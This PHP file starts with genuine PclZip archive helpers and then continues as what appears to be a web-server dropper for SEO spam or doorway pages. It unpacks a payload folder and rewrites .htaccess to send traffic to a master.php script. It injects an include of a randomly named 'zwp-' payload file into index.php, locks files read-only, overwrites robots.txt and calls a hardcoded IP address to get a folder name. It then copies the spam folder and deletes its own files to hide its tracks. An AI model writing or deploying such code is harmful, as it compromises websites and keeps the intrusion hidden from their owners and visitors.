function PclZipUtilRename($p_src, $p_dest)
{
  $v_result = 1;

  if (!@rename($p_src, $p_dest)) {

    if (!@copy($p_src, $p_dest)) {
      $v_result = 0;
    }
    else if (!@unlink($p_src)) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilOptionText($p_option)
{
  
  $v_list = get_defined_constants();
  for (reset($v_list); $v_key = key($v_list); next($v_list)) {
    $v_prefix = substr($v_key, 0, 10);
    if ((   ($v_prefix == 'PCLZIP_OPT')
         || ($v_prefix == 'PCLZIP_CB_')
         || ($v_prefix == 'PCLZIP_ATT'))
        && ($v_list[$v_key] == $p_option)) {
      return $v_key;
    }
  }
  
  $v_result = 'Unknown';

  return $v_result;
}

function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)
{
  if (stristr(php_uname(), 'windows')) {
    if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
        $p_path = substr($p_path, $v_position+1);
    }
    if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
        $p_path = strtr($p_path, '\\', '/');
    }
  }
  return $p_path;
}




$archive = new PclZip($foldername."/".$myfilename.".zip");
if ($archive->extract(PCLZIP_OPT_PATH, "$foldername") == 0) {
echo "Error : ".$archive->errorInfo(true);
}
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n";

$result = '<?php
ignore_user_abort();
set_time_limit(0);

$f1 = ".ht"; $f2 = "acc"; $f3 = "ess";
$ff = $f1.$f2.$f3;

if (file_exists($ff)) chmod ($ff, 0777);
if (filesize($ff)>120)
{
	$htout = fopen($ff, "w");
	fwrite($htout, "RewriteEngine On 
RewriteRule ^([A-Za-z0-9-]+).html$ master.php?world=5&looping=176&hl=$1 [L]");
fclose($htout);
}

?>';

$z = fopen("$foldername/zzz.php", "w");
fwrite($z, $result);
fclose($z);

 if (isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') { $protocol = 'https://'; } else { $protocol = 'http://'; } 

$outlink = "$protocol".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."/$foldername/\n";
$outlink = str_replace("z1.php/", "", $outlink);
echo $outlink;
         ob_flush();
         flush();


$filename = $foldername."/"."zzzcode.txt";
$handle = fopen($filename, "r");
$code = fread($handle, filesize($filename));
fclose($handle);
unlink($foldername."/"."zzzcode.txt");

$mynamee='zwp-';     
for ($ns=1;$ns<rand(6,6);$ns++)     
{     
$r = rand (0,count($let)-1);     
$mynamee .= $let[$r];     
} 

if (file_exists("index.php"))
{
	 $file = fopen("index.php", "r");
$buffer = fread($file, filesize("index.php")); 
$buffer2 = str_replace("\n", "11111111111111", $buffer);
if (strpos($buffer2, 'zwp-')<5) 
{
chmod ("index.php", 0777);
$out = fopen("$mynamee", "w");
fwrite($out, $code);
fclose($out);

$file = fopen("index.php", "r");  


    $file_data = "<?php include(\"".$mynamee."\");?>\n".$buffer;
    file_put_contents('index.php', $file_data);
chmod ("index.php", 0444);
}
}

if (file_exists("robots.txt"))
{
$outht = fopen("robots.txt", "w");
fwrite($outht, "User-agent: *

Allow: /");
fclose($outht);
}

$newfilename='';     
for ($ns=1;$ns<rand(10,20);$ns++)     
{     
$r = rand (0,count($let)-1);     
$newfilename .= $let[$r];     
}  

$newredirectname='';     
for ($ns=1;$ns<rand(10,20);$ns++)     
{     
$r = rand (0,count($let)-1);     
$newredirectname .= $let[$r];     
}  

$file = fopen($foldername."/.htaccess", "r");  
$buffer = fread($file, filesize($foldername."/.htaccess")); 
$buffer = str_replace("\n", "11111111111111", $buffer);
fclose($file);
$in = fopen($foldername."/.htaccess", "w");
$buffer = str_replace("master.php", "$newfilename.php", $buffer);
$buffer = str_replace("11111111111111", "\n", $buffer);
fwrite($in, $buffer);
fclose($in);
chmod ($foldername."/.htaccess", 0555);

$file = fopen($foldername."/master.php", "r");  
$buffer = fread($file, filesize($foldername."/master.php")); 
$buffer = str_replace("\n", "11111111111111", $buffer);
fclose($file);
$in = fopen($foldername."/master.php", "w");
$buffer = str_replace("master.php", "$newfilename.php", $buffer);
$buffer = str_replace("11111111111111", "\n", $buffer);
fwrite($in, $buffer);
fclose($in);

$file = fopen($foldername."/master.php", "r");  
$buffer = fread($file, filesize($foldername."/master.php")); 
$buffer = str_replace("\n", "11111111111111", $buffer);
fclose($file);
$in = fopen($foldername."/master.php", "w");
$buffer = str_replace("red.php", "$newredirectname", $buffer);
$buffer = str_replace("11111111111111", "\n", $buffer);
fwrite($in, $buffer);
fclose($in);

rename($foldername."/red.php", $foldername."/$newredirectname");

$file = fopen($foldername."/zzz.php", "r");  
$buffer = fread($file, filesize($foldername."/zzz.php")); 
$buffer = str_replace("\n", "11111111111111", $buffer);
fclose($file);
$in = fopen($foldername."/zzz.php", "w");
$buffer = str_replace("master.php", "$newfilename.php", $buffer);
$buffer = str_replace("11111111111111", "\n", $buffer);
fwrite($in, $buffer);
fclose($in);

rename ($foldername."/master.php", $foldername."/$newfilename.php");

@unlink("z1.php");

unlink($foldername."/".$myfilename.".zip");
$scriptname= str_replace("/", "", $_SERVER["SCRIPT_NAME"]);
@unlink($scriptname);

$foldername2='';     
/*
for ($ns=1;$ns<rand(7,15);$ns++)     
{     
$r = rand (0,count($let)-1);     
$foldername2 .= $let[$r];     
} */

	$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://135.181.21.126/foldernames.php"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
$foldername2 = curl_exec($ch); 
curl_close($ch);

if (strlen($foldername2)<5) $foldername2 = file_get_contents("http://135.181.21.126/foldernames.php"); 
 
mkdir($foldername2, 0777);

$in = scandir($foldername);
foreach ($in as $inn)
{
	if (($inn !== ".") AND ($inn !== "..")) copy ("$foldername/$inn", "$foldername2/$inn");
}
chmod ($foldername2."/.htaccess", 0555);

chmod ($foldername."/$newfilename.php", 0555);
chmod ($foldername2."/$newfilename.php", 0555);

chmod ($foldername."/$newredirectname", 0555);
chmod ($foldername2."/$newredirectname", 0555);

$outlink = "$protocol".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."/$foldername2/\n";
$outlink = str_replace("z1.php/", "", $outlink);
echo $outlink;
         ob_flush();
         flush();

?>